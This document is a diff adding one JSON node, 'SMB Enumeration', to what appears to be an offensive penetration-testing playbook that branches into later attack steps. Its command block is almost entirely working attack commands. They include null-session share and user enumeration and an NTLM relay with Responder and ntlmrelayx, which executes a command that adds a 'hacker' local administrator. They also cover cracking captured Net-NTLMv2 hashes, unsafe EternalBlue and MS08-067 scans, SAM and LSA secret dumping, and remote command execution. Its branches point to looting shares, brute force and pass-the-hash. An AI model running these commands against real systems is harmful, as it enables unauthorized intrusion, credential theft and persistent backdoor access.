@@ -1,0 +1,34 @@
+{
+  "id": "smb_enum",
+  "phase": "SMB",
+  "title": "SMB Enumeration",
+  "body": "SMB is information-rich. Null session, guest access, share contents, user enumeration. EternalBlue check is mandatory.",
+  "cmd": "# ── BASIC ENUM ────────────────────────────────────────\nenum4linux-ng -A $ip | tee smb_enum.txt\nnmap -p 445 -sV $ip\n\n# ── NULL / GUEST SESSION ──────────────────────────────\ncrackmapexec smb $ip -u '' -p '' --shares\ncrackmapexec smb $ip -u 'guest' -p '' --shares\ncrackmapexec smb $ip -u '' -p '' --users\ncrackmapexec smb $ip -u '' -p '' --groups\ncrackmapexec smb $ip -u '' -p '' --pass-pol\n\n# List + browse shares\nsmbclient -L //$ip -N\nsmbclient //$ip/share -N\n\n# ── SMB SIGNING CHECK (relay attack prerequisite) ─────\ncrackmapexec smb $ip --gen-relay-list relay_targets.txt\nnmap -p 445 --script smb2-security-mode $ip\n# If \"Message signing enabled but not required\" = relay possible\n\n# ── NTLM RELAY ATTACK ─────────────────────────────────\n# Step 1: check signing disabled\n# Step 2: on Kali — start responder (disable SMB/HTTP)\n# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off\nsudo responder -I tun0 -rdw\n# Step 3: ntlmrelayx — relay to target\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support\n# With command execution:\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"net user hacker pass123! /add && net localgroup administrators hacker /add\"\n# Step 4: trigger auth — wait or coerce via printerbug/petitpotam\n\n# ── NET-NTLMv2 CAPTURE (Responder) ───────────────────\n# Start responder to capture hashes\nsudo responder -I tun0 -rdwv\n# Hashes saved to /usr/share/responder/logs/\n# Crack captured hash:\nhashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# ── VULN SCAN ─────────────────────────────────────────\nnmap -p 445 --script smb-vuln-ms17-010 $ip\nnmap -p 445 --script smb-vuln-ms08-067 --script-args=unsafe=1 $ip\nnmap -Pn -sV -p 445 \\\n  \"--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)\" \\\n  --script-args=unsafe=1 -oN nse_smb.txt $ip\n\n# ── WITH CREDS ────────────────────────────────────────\ncrackmapexec smb $ip -u user -p 'password' --shares\ncrackmapexec smb $ip -u user -p 'password' --users\ncrackmapexec smb $ip -u user -p 'password' --sam\ncrackmapexec smb $ip -u user -p 'password' --lsa\ncrackmapexec smb $ip -u user -p 'password' -x \"whoami\"\ncrackmapexec smb $ip -u user -p 'password' -X \"Get-LocalUser\"",
+  "warn": null,
+  "choices": [
+    {
+      "label": "MS17-010 / EternalBlue vulnerable",
+      "next": "eternalblue"
+    },
+    {
+      "label": "Signing disabled — NTLM relay",
+      "next": "smb_relay"
+    },
+    {
+      "label": "Captured Net-NTLMv2 — crack it",
+      "next": "hashcrack"
+    },
+    {
+      "label": "Readable shares — download everything",
+      "next": "smb_loot"
+    },
+    {
+      "label": "Got creds — PTH or spray",
+      "next": "pth"
+    },
+    {
+      "label": "Got usernames — brute force",
+      "next": "bruteforce"
+    }
+  ]
+}
